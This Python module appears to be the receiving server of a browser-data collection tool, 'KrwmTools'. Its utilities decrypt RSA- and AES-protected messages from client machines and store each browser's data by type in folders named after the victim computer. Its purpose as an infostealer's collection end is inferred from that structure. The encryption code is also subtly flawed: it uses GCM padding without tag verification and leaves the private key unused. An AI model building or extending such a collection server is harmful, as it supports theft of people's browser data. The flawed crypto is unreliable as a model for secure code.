""" IMPORTS """
import os
import json
from datetime import datetime
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import unpad


""" CONSTANTS """
KRWM_DIR = os.path.expanduser('~/Documents/KrwmTools')
LOGS_PATH = KRWM_DIR + '/Server Logs'

BITS_IN_BYTE = 8
RSA_MOD_LEN = 256
RSA_MOD_LEN_B64 = 344

FORMAT = 'utf-8'

rsa_info = {
    'public_key': b'',
    'cipher': None,
}


"""
Communication Utilities
"""
def socket_recvall(client_socket, num_bytes: int):
    """ Wrapper function for socket recv method to receive the full num_bytes """
    received = b''
    while len(received) != num_bytes:
        missing = num_bytes - len(received)
        received += client_socket.recv(missing)
    return received



"""
RSA Utilities
"""
def initialise_rsa_cipher() -> None:
    """ Generates private and public key pairs for encryption and decryption """
    # generate RSA pairs
    key = RSA.generate(bits=RSA_MOD_LEN * BITS_IN_BYTE)
    # generate private key
    private_key = key.export_key()
    # generate public key
    public_key = key.publickey().export_key()
    rsa_info['public_key'] = public_key
    # prepare RSA cipher
    rsa_cipher = PKCS1_OAEP.new(key)
    rsa_info['cipher'] = rsa_cipher


def rsa_decrypt(ciphertext: bytes) -> dict:
    """ Decrypts ciphertext using the RSA cipher """
    rsa_cipher = rsa_info['cipher']
    plaintext = rsa_cipher.decrypt(ciphertext)
    return plaintext


def get_public_key() -> bytes:
    """ Returns the base64-encoded public key """
    return b64encode(rsa_info['public_key'])



"""
AES Utilities
"""
def extract_aes_key(client_socket) -> bytes:
    """ Receives and decrypts the AES key from a client socket """
    aes_key = socket_recvall(client_socket, RSA_MOD_LEN_B64)
    aes_key = b64decode(aes_key)
    aes_key = rsa_decrypt(aes_key)
    return aes_key


def extract_message(client_socket, aes_key: bytes) -> dict:
    """ Extracts a message from a client socket """
    # Extract and decrypt RSA-encrypted header
    header = socket_recvall(client_socket, RSA_MOD_LEN)
    if not header:
        return {}
    header = rsa_decrypt(header)
    header = json.loads(header.decode(FORMAT))

    # Receive ciphertext
    ciphertext_length = header['ciphertext_length']
    ciphertext = socket_recvall(client_socket, ciphertext_length)
    print(f'Received {len(ciphertext)} bytes')

    # Decrypt ciphertext
    nonce = b64decode(header['nonce'].encode(FORMAT))
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce)
    plaintext = aes_cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, AES.block_size)

    # Extract message
    message = plaintext.decode(FORMAT)
    message = json.loads(message)
    return message



"""
LOG Utilities
"""
def mkdir_if_not_exists(path: str) -> None:
    """ Creates a directory at path if it does not exist yet """
    if not os.path.exists(path):
        os.mkdir(path)


def log_setup(client_socket, aes_key) -> str:
    """ Setup log directories for client info """
    # Retrieve client info
    client_info = extract_message(client_socket, aes_key)
    computer_name = client_info['computer']

    # Setup client logs folder
    mkdir_if_not_exists(KRWM_DIR)
    mkdir_if_not_exists(LOGS_PATH)
    current_time = datetime.now().strftime(r'%Y-%m-%d %H-%M-%S')
    logs_dir = f'{LOGS_PATH}/{computer_name} {current_time}'
    mkdir_if_not_exists(logs_dir)
    return logs_dir


def log_message(message: dict, logs_dir: str) -> None:
    """ Logs a message into logs_dir """
    # Destructure message
    browser_name = message['browser']
    file_name = message['type']
    data = message['data']

    # Create browser directory if necessary
    browser_path = f'{logs_dir}/{browser_name}'
    mkdir_if_not_exists(browser_path)

    # Log data into file_path
    file_path = f'{browser_path}/{file_name}.json'
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)
